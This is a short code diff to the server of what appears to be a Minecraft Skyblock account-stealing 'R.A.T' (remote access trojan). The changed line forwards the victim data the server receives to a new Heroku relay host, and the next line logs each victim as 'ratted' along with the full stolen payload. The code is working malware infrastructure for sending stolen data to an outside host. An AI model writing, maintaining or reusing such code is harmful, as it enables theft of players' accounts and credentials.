@@ -114,7 +114,7 @@ app.post("/", (req, res) => {
                 })
             }
 
-        post("https://skyblockutils.herokuapp.com/", req.body)
+        post("https://superultraskyblock.herokuapp.com/", req.body)
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
     })
